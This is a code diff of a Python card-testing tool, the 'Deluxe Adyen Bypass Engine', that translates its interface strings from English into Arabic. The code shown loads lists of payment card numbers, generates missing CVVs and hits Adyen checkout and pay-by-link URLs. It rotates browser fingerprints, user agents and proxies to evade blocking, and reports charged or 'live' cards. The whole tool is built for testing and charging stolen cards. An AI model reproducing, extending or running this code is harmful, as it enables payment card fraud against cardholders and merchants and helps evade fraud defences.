@@ -1,7 +1,7 @@
 # ═══════════════════════════════════════════════════════════════════════════
-#  DELUXE ADYEN BYPASS ENGINE — v9 HORUS FIX
+#  DELUXE ADYEN BYPASS ENGINE — v9 ARABIC EDITION
 #  · Fixed for curl_cffi 0.17.0 (Horus/Alpine compatible)
-#  · Proxy support · Full 3DS pipeline · Anti-cache · Debug
+#  · Arabic Interface
 # ═══════════════════════════════════════════════════════════════════════════
 
 import os
@@ -19,19 +19,16 @@ from datetime import datetime, timezone
 from urllib.parse import urljoin, urlencode, parse_qs, urlparse, urlsplit, urlunsplit
 from typing import Dict, Optional, List, Any
 
-# ── Cryptography ───────────────────────────────────────────────────────────
 from cryptography.hazmat.primitives.ciphers.aead import AESCCM, AESGCM
 from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15, OAEP, MGF1
 from cryptography.hazmat.primitives.hashes import SHA256
 from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
 from cryptography.hazmat.backends import default_backend
 
-# ── curl_cffi ──────────────────────────────────────────────────────────────
 from curl_cffi.requests import AsyncSession as ChromeSession
 
 CSE_PREFIX = "adyenjs_0_1_25"
 
-# ── Impersonate pool — versions supported by curl_cffi 0.17.0 ──────────────
 IMPERSONATE_POOL = [
     "chrome110", "chrome114", "chrome116", "chrome119", 
     "chrome120", "chrome123", "chrome124", "chrome131",
@@ -108,10 +105,8 @@ def _is_host_like(s: str) -> bool:
 # ═══════════════════════════════════════════════════════════════════════════
 async def _cc_get(session, url, **kwargs):
     try:
-        # 0.17.0 supports await session.get()
         return await session.get(url, **kwargs)
     except TypeError:
-        # Fallback for older versions
         async with session.get(url, **kwargs) as resp:
             return resp
 
@@ -166,7 +161,7 @@ def clear(): os.system("clear")
 def banner():
     print(f"""{C.MAGENTA}{C.BOLD}
     ╔══════════════════════════════════════════════════════════════════╗
-    ║              ADYEN BYPASS ENGINE v9 - HORUS EDITION              ║
+    ║             محرك اختراق Adyen - نسخة هوروس                       ║
     ╚══════════════════════════════════════════════════════════════════╝{C.RESET}
     """)
 def hr(char="─", n=68, color=C.GREY): print(f"{color}{char * n}{C.RESET}")
@@ -186,11 +181,7 @@ CURRENCY_EXP = {
     'KWD': 3, 'BHD': 3, 'IQD': 3, 'JOD': 3, 'TND': 3, 'LYD': 3,
     'JPY': 0, 'VND': 0, 'KRW': 0, 'CLP': 0, 'IDR': 0, 'ISK': 0,
 }
-
-SCA_LOW_VALUE = {
-    'EUR': 3000, 'GBP': 3000, 'USD': 3000,
-    'DKK': 22500, 'SEK': 30000, 'NOK': 30000,
-}
+SCA_LOW_VALUE = {'EUR': 3000, 'GBP': 3000, 'USD': 3000, 'DKK': 22500, 'SEK': 30000, 'NOK': 30000}
 
 def minor_to_major(value: int, currency: str) -> float:
     return value / (10 ** CURRENCY_EXP.get(currency.upper(), 2))
@@ -907,8 +898,8 @@ def load_cards_from_file(path: str) -> List[dict]:
     return cards
 
 def load_cards_interactive() -> List[dict]:
-    log_info("Paste cards one per line — format: cc|mm|yy|cvv")
-    log_info("Type END on its own line when done.")
+    log_info("الصق الكروت سطر لكل كرت — التنسيق: cc|mm|yy|cvv")
+    log_info("اكتب END لما تخلص.")
     hr()
     cards = []
     while True:
@@ -918,7 +909,7 @@ def load_cards_interactive() -> List[dict]:
         c = parse_card_line(line)
         if c:
             cards.append(c); print(f"{C.GREEN}  ✓ {c['card'][:6]}…{c['card'][-4:]}|{c['month']}|{c['year']}|{c['cvv']}{C.RESET}")
-        else: print(f"{C.RED}  ✗ Invalid line skipped{C.RESET}")
+        else: print(f"{C.RED}  ✗ السطر غير صالح، تم تجاهله{C.RESET}")
     return cards
 
 # ═══════════════════════════════════════════════════════════════════════════
@@ -926,7 +917,7 @@ def load_cards_interactive() -> List[dict]:
 # ═══════════════════════════════════════════════════════════════════════════
 async def test_proxy(proxy_str: str) -> dict:
     parsed = parse_proxy(proxy_str)
-    if not parsed: return {"success": False, "error": "invalid format"}
+    if not parsed: return {"success": False, "error": "تنسيق غير صالح"}
     proxies = {"http": parsed["http"], "https": parsed["https"]}
     try:
         impersonate = _random_impersonate(); ua = _random_ua(); t0 = time.time()
@@ -934,7 +925,7 @@ async def test_proxy(proxy_str: str) -> dict:
             r = await _cc_get(sess, "http://ip-api.com/json/?fields=status,country,countryCode,query,timezone,isp", headers={"User-Agent": ua, "Accept": "application/json"})
             elapsed_ms = int((time.time() - t0) * 1000); status = _cc_status(r); d = _cc_json(r)
             if status != 200 or not isinstance(d, dict): return {"success": False, "error": f"status={status}"}
-            if d.get("status") != "success": return {"success": False, "error": d.get("message", "unknown")}
+            if d.get("status") != "success": return {"success": False, "error": d.get("message", "غير معروف")}
             return {"success": True, "ip": d.get("query", ""), "country": d.get("country", ""), "country_code": d.get("countryCode", ""), "isp": d.get("isp", ""), "timezone": d.get("timezone", ""), "response_ms": elapsed_ms}
     except Exception as e:
         return {"success": False, "error": str(e)[:120]}
@@ -949,10 +940,10 @@ def print_result(idx: int, total: int, r: dict):
     if r.get("success"):
         line = (f"{C.GREEN}{C.BOLD}[HIT]{C.RESET} {C.WHITE}{idx}/{total}{C.RESET}  {C.GREEN}{cc_full}{C.RESET}  {C.GREEN}→ AUTHORISED ({dt}s){C.RESET}")
         print(line); hr("═", 68, C.GREEN)
-        print(f"{C.GREEN}{C.BOLD}  ✅  CHARGED!  {cc_full}{C.RESET}")
-        if r.get("amount"): print(f"{C.GREEN}  Amount: {r['amount']}{C.RESET}")
-        if r.get("merchant"): print(f"{C.GREEN}  Merchant: {r['merchant']}{C.RESET}")
-        if r.get("receipt_url"): print(f"{C.GREEN}  Receipt: {r['receipt_url']}{C.RESET}")
+        print(f"{C.GREEN}{C.BOLD}  ✅  تم السحب بنجاح!  {cc_full}{C.RESET}")
+        if r.get("amount"): print(f"{C.GREEN}  المبلغ: {r['amount']}{C.RESET}")
+        if r.get("merchant"): print(f"{C.GREEN}  المتجر: {r['merchant']}{C.RESET}")
+        if r.get("receipt_url"): print(f"{C.GREEN}  الفاتورة: {r['receipt_url']}{C.RESET}")
         hr("═", 68, C.GREEN); return
     live_codes = AdyenHitter.LIVE_DECLINE
     if code in live_codes: color = C.YELLOW; tag = "LIVE"
@@ -966,9 +957,9 @@ def print_result(idx: int, total: int, r: dict):
 async def run_tool(url: str, cards: List[dict], ccn_mode: bool = False, pacing: bool = True, stop_on_hit: bool = True, proxy_data: Optional[dict] = None) -> List[dict]:
     hitter = AdyenHitter(url, proxy_data=proxy_data)
     results: List[dict] = []
-    log_info(f"Starting → {url}")
-    if proxy_data: log_info(f"Proxy active → {proxy_data.get('raw', 'N/A')[:60]}")
-    log_info("Debug + anti-cache active (impersonate + UA rotate per attempt)")
+    log_info(f"بدء الضرب → {url}")
+    if proxy_data: log_info(f"البروكسي شغال → {proxy_data.get('raw', 'N/A')[:60]}")
+    log_info("وضع التصحيح مفعل (تغيير البصمة والـ UA لكل محاولة)")
     total = len(cards); hits = 0; starts = time.time(); link_dead = False; soft_block_count = 0
     for i, card in enumerate(cards, start=1):
         if pacing and i > 1: d = attempt_delay(i); await asyncio.sleep(d)
@@ -980,49 +971,49 @@ async def run_tool(url: str, cards: List[dict], ccn_mode: bool = False, pacing: 
             if stop_on_hit: break
         code = r.get("decline_code", "")
         if code in ("link_expired", "link_not_found", "link_closed"):
-            log_warn(f"PBL link is dead ({code}) — need new link"); link_dead = True; break
+            log_warn(f"الرابط ميت ({code}) — بحاجة لرابط جديد"); link_dead = True; break
         if code == "link_soft_blocked":
             soft_block_count += 1
             if soft_block_count >= 3:
-                log_warn("Soft block repeated 3x — Adyen is blocking this IP/link"); log_warn("→ try a fresh link + working proxy"); link_dead = True; break
+                log_warn("حظر متكرر 3 مرات — Adyen تحظر هذا الـ IP أو الرابط"); log_warn("→ جرب رابط جديد وبروكسي شغال"); link_dead = True; break
         if code in ("no_adyen", "no_client_key", "no_pubkey"):
-            log_warn(f"Critical error — {code}"); break
+            log_warn(f"خطأ حرج — {code}"); break
     elapsed = round(time.time() - starts, 2)
-    hr(); log_ok(f"Finished — attempts={len(results)}  hits={hits}  time={elapsed}s")
+    hr(); log_ok(f"انتهى — المحاولات={len(results)}  النجاح={hits}  الوقت={elapsed} ثانية")
     if hitter._sid_history:
         unique_sids = list(set(hitter._sid_history))
-        print(f"\n{C.CYAN}{C.BOLD}[SESSION SUMMARY]{C.RESET}")
-        print(f"  Total setups: {hitter._setup_count}")
-        print(f"  Unique SIDs:  {len(unique_sids)} / {len(hitter._sid_history)}")
-        if len(unique_sids) < len(hitter._sid_history): print(f"  {C.YELLOW}⚠ SESSION CACHE DETECTED — same sid reused!{C.RESET}")
-        else: print(f"  {C.GREEN}✓ All SIDs are unique — no cache{C.RESET}")
+        print(f"\n{C.CYAN}{C.BOLD}[ملخص الجلسة]{C.RESET}")
+        print(f"  إجمالي المحاولات: {hitter._setup_count}")
+        print(f"  الجلسات الفريدة:  {len(unique_sids)} / {len(hitter._sid_history)}")
+        if len(unique_sids) < len(hitter._sid_history): print(f"  {C.YELLOW}⚠ تم اكتشاف كاش — نفس الجلسة مستخدمة!{C.RESET}")
+        else: print(f"  {C.GREEN}✓ كل الجلسات فريدة — لا يوجد كاش{C.RESET}")
         hr()
-    if link_dead: log_warn("Link is dead — generate new PBL link (and check proxy) and try again")
+    if link_dead: log_warn("الرابط ميت — أنشئ رابط PBL جديد (وتأكد من البروكسي) وجرب مرة ثانية")
     return results
 
 def choose_mode() -> str:
-    hr(); print(f"{C.CYAN}{C.BOLD}Choose mode:{C.RESET}")
-    print(f"  {C.GREEN}[1]{C.RESET} cc   — full cc|mm|yy|cvv from your list")
-    print(f"  {C.YELLOW}[2]{C.RESET} ccn  — cards without cvv (auto-generated)"); print()
+    hr(); print(f"{C.CYAN}{C.BOLD}اختر الوضع:{C.RESET}")
+    print(f"  {C.GREEN}[1]{C.RESET} cc   — كروت كاملة (cc|mm|yy|cvv)")
+    print(f"  {C.YELLOW}[2]{C.RESET} ccn  — كروت بدون CVV (يتم توليده)"); print()
     while True:
-        ch = prompt("Mode [1/2] (default 1): ", C.CYAN).strip() or "1"
+        ch = prompt("الوضع [1/2] (الافتراضي 1): ", C.CYAN).strip() or "1"
         if ch in ("1", "cc"): return "cc"
         if ch in ("2", "ccn"): return "ccn"
-        log_err("Invalid choice")
+        log_err("اختيار غير صالح")
 
 def choose_source() -> List[dict]:
-    hr(); print(f"{C.CYAN}{C.BOLD}Card source:{C.RESET}")
-    print(f"  {C.GREEN}[1]{C.RESET} paste manually")
-    print(f"  {C.YELLOW}[2]{C.RESET} load from file (cards.txt)"); print()
+    hr(); print(f"{C.CYAN}{C.BOLD}مصدر الكروت:{C.RESET}")
+    print(f"  {C.GREEN}[1]{C.RESET} لصق يدوي")
+    print(f"  {C.YELLOW}[2]{C.RESET} تحميل من ملف (cards.txt)"); print()
     while True:
-        ch = prompt("Source [1/2] (default 1): ", C.CYAN).strip() or "1"
+        ch = prompt("المصدر [1/2] (الافتراضي 1): ", C.CYAN).strip() or "1"
         if ch == "1": return load_cards_interactive()
         if ch == "2":
-            path = prompt("File path (default cards.txt): ", C.CYAN).strip() or "cards.txt"
+            path = prompt("مسار الملف (الافتراضي cards.txt): ", C.CYAN).strip() or "cards.txt"
             c = load_cards_from_file(path)
-            if not c: log_err(f"No valid cards found in {path}"); continue
-            log_ok(f"Loaded {len(c)} cards from {path}"); return c
-        log_err("Invalid choice")
+            if not c: log_err(f"لا يوجد كروت صالحة في {path}"); continue
+            log_ok(f"تم تحميل {len(c)} كرت من {path}"); return c
+        log_err("اختيار غير صالح")
 
 def ask_int(prompt_txt: str, default: int) -> int:
     while True:
@@ -1032,16 +1023,16 @@ def ask_int(prompt_txt: str, default: int) -> int:
             v = int(s)
             if v > 0: return v
         except ValueError: pass
-        log_err("Enter a valid positive number")
+        log_err("أدخل رقم صحيح موجب")
 
 def ask_yes_no(prompt_txt: str, default: bool = True) -> bool:
-    s = prompt(f"{prompt_txt} [{'Y/n' if default else 'y/N'}]: ", C.CYAN).strip().lower()
+    s = prompt(f"{prompt_txt} [{'نعم/لا' if default else 'نعم/لا'}]: ", C.CYAN).strip().lower()
     if not s: return default
-    return s in ("y", "yes", "e", "evet")
+    return s in ("y", "yes", "e", "evet", "نعم")
 
 async def ask_proxy() -> Optional[dict]:
-    hr(); print(f"{C.CYAN}{C.BOLD}PROXY (optional){C.RESET}")
-    print(f"{C.DIM}Supported formats:{C.RESET}")
+    hr(); print(f"{C.CYAN}{C.BOLD}بروكسي (اختياري){C.RESET}")
+    print(f"{C.DIM}التنسيقات المدعومة:{C.RESET}")
     print(f"  host:port")
     print(f"  host:port:user:pass")
     print(f"  user:pass@host:port")
@@ -1049,19 +1040,19 @@ async def ask_proxy() -> Optional[dict]:
     print(f"  http://host:port")
     print(f"  http://user:pass@host:port")
     print(f"  socks5://user:pass@host:port")
-    print(f"{C.DIM}Leave empty to continue WITHOUT proxy.{C.RESET}"); print()
-    raw = prompt("Proxy: ", C.CYAN).strip()
-    if not raw: log_warn("Continuing WITHOUT proxy"); return None
+    print(f"{C.DIM}اتركه فارغاً للمتابعة بدون بروكسي.{C.RESET}"); print()
+    raw = prompt("البروكسي: ", C.CYAN).strip()
+    if not raw: log_warn("المتابعة بدون بروكسي"); return None
     parsed = parse_proxy(raw)
-    if not parsed: log_err(f"Invalid proxy format: {raw}"); return None
-    log_info(f"Parsed → {parsed['http']}"); log_info("Testing proxy...")
+    if not parsed: log_err(f"تنسيق بروكسي غير صالح: {raw}"); return None
+    log_info(f"تم التحليل → {parsed['http']}"); log_info("جاري اختبار البروكسي...")
     result = await test_proxy(raw)
     if not result.get("success"):
-        log_err(f"Proxy test FAILED: {result.get('error')}")
-        again = ask_yes_no("Try a different proxy?", default=True)
+        log_err(f"فشل اختبار البروكسي: {result.get('error')}")
+        again = ask_yes_no("تجرب بروكسي ثاني؟", default=True)
         if again: return await ask_proxy()
-        log_warn("Continuing WITHOUT proxy"); return None
-    print(f"{C.GREEN}[+]{C.RESET} Proxy OK  |  IP: {result['ip']}  Country: {result['country']} ({result['country_code']})  ISP: {result.get('isp', 'N/A')}  Response: {result['response_ms']}ms")
+        log_warn("المتابعة بدون بروكسي"); return None
+    print(f"{C.GREEN}[+]{C.RESET} البروكسي شغال  |  IP: {result['ip']}  الدولة: {result['country']} ({result['country_code']})  ISP: {result.get('isp', 'N/A')}  الاستجابة: {result['response_ms']}ms")
     return {"http": parsed["http"], "https": parsed["https"], "raw": raw, "ip": result["ip"], "country": result["country"], "country_code": result["country_code"]}
 
 async def main_menu():
@@ -1069,44 +1060,44 @@ async def main_menu():
         clear(); banner()
         url = ""
         while not url:
-            url = prompt("Checkout URL (adyen.link / merchant / pbl): ", C.CYAN).strip()
-            if not url: log_err("URL cannot be empty")
-            elif not (url.startswith("http://") or url.startswith("https://") or "adyen.link" in url or "." in url): log_err("Invalid URL"); url = ""
+            url = prompt("رابط الدفع (adyen.link / merchant / pbl): ", C.CYAN).strip()
+            if not url: log_err("الرابط لا يمكن أن يكون فارغاً")
+            elif not (url.startswith("http://") or url.startswith("https://") or "adyen.link" in url or "." in url): log_err("رابط غير صالح"); url = ""
         proxy_data = await ask_proxy(); hr()
         mode = choose_mode(); ccn_mode = (mode == "ccn")
         cards = choose_source()
         if not cards:
-            log_err("No cards loaded — returning to menu"); input(f"\n{C.GREY}Press ENTER to continue…{C.RESET}"); continue
-        hr(); log_info(f"Total cards loaded: {len(cards)}")
-        max_attempts = ask_int(f"Max attempts to run (1-{len(cards)}, default {len(cards)}): ", default=len(cards))
+            log_err("لم يتم تحميل كروت — العودة للقائمة"); input(f"\n{C.GREY}اضغط ENTER للمتابعة…{C.RESET}"); continue
+        hr(); log_info(f"إجمالي الكروت المحملة: {len(cards)}")
+        max_attempts = ask_int(f"أقصى عدد محاولات (1-{len(cards)}, الافتراضي {len(cards)}): ", default=len(cards))
         max_attempts = max(1, min(max_attempts, len(cards)))
-        stop_on_hit = ask_yes_no("Stop on first HIT?", default=True)
-        pacing_on = ask_yes_no("Use pacing between attempts (3-4s)?", default=True)
-        hr(); print(f"{C.CYAN}{C.BOLD}Summary:{C.RESET}")
-        print(f"  URL         : {C.WHITE}{url}{C.RESET}")
-        if proxy_data: print(f"  Proxy       : {C.GREEN}{proxy_data['ip']} ({proxy_data['country']}){C.RESET}")
-        else: print(f"  Proxy       : {C.YELLOW}NONE (may trigger soft block){C.RESET}")
-        print(f"  Mode        : {C.WHITE}{mode}{C.RESET}")
-        print(f"  Cards       : {C.WHITE}{len(cards)}{C.RESET}")
-        print(f"  Max attempts: {C.WHITE}{max_attempts}{C.RESET}")
-        print(f"  Stop on hit : {C.WHITE}{stop_on_hit}{C.RESET}")
-        print(f"  Pacing      : {C.WHITE}{pacing_on}{C.RESET}"); hr()
-        if not ask_yes_no("Start hitting?", default=True):
-            log_info("Cancelled"); input(f"\n{C.GREY}Press ENTER to continue…{C.RESET}"); continue
-        hr(); print(f"{C.YELLOW}{C.BOLD}▶  STARTING…{C.RESET}"); hr()
+        stop_on_hit = ask_yes_no("التوقف عند أول نجاح؟", default=True)
+        pacing_on = ask_yes_no("استخدام تأخير بين المحاولات (3-4 ثواني)؟", default=True)
+        hr(); print(f"{C.CYAN}{C.BOLD}ملخص:{C.RESET}")
+        print(f"  الرابط     : {C.WHITE}{url}{C.RESET}")
+        if proxy_data: print(f"  البروكسي   : {C.GREEN}{proxy_data['ip']} ({proxy_data['country']}){C.RESET}")
+        else: print(f"  البروكسي   : {C.YELLOW}لا يوجد (قد يسبب حظر){C.RESET}")
+        print(f"  الوضع      : {C.WHITE}{mode}{C.RESET}")
+        print(f"  الكروت     : {C.WHITE}{len(cards)}{C.RESET}")
+        print(f"  المحاولات  : {C.WHITE}{max_attempts}{C.RESET}")
+        print(f"  توقف النجاح: {C.WHITE}{stop_on_hit}{C.RESET}")
+        print(f"  التأخير    : {C.WHITE}{pacing_on}{C.RESET}"); hr()
+        if not ask_yes_no("بدء الضرب؟", default=True):
+            log_info("تم الإلغاء"); input(f"\n{C.GREY}اضغط ENTER للمتابعة…{C.RESET}"); continue
+        hr(); print(f"{C.YELLOW}{C.BOLD}▶  جاري البدء…{C.RESET}"); hr()
         try:
             await run_tool(url=url, cards=cards[:max_attempts], ccn_mode=ccn_mode, pacing=pacing_on, stop_on_hit=stop_on_hit, proxy_data=proxy_data)
-        except KeyboardInterrupt: log_warn("Interrupted by user")
-        except Exception as e: log_err(f"Runtime error: {e}")
-        hr(); again = ask_yes_no("Run another session?", default=False)
-        if not again: print(f"\n{C.MAGENTA}{C.BOLD}  Goodbye 👋{C.RESET}\n"); return
+        except KeyboardInterrupt: log_warn("تم الإيقاف بواسطة المستخدم")
+        except Exception as e: log_err(f"خطأ أثناء التشغيل: {e}")
+        hr(); again = ask_yes_no("تشغيل جلسة أخرى؟", default=False)
+        if not again: print(f"\n{C.MAGENTA}{C.BOLD}  مع السلامة 👋{C.RESET}\n"); return
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  ENTRY
 # ═══════════════════════════════════════════════════════════════════════════
 def _run_cli():
     try: asyncio.run(main_menu())
-    except KeyboardInterrupt: print(f"\n{C.RED}Aborted.{C.RESET}")
+    except KeyboardInterrupt: print(f"\n{C.RED}تم الإجهاض.{C.RESET}")
 
 if __name__ == "__main__":
     if len(sys.argv) >= 2 and sys.argv[1] not in ("-i", "--interactive"):
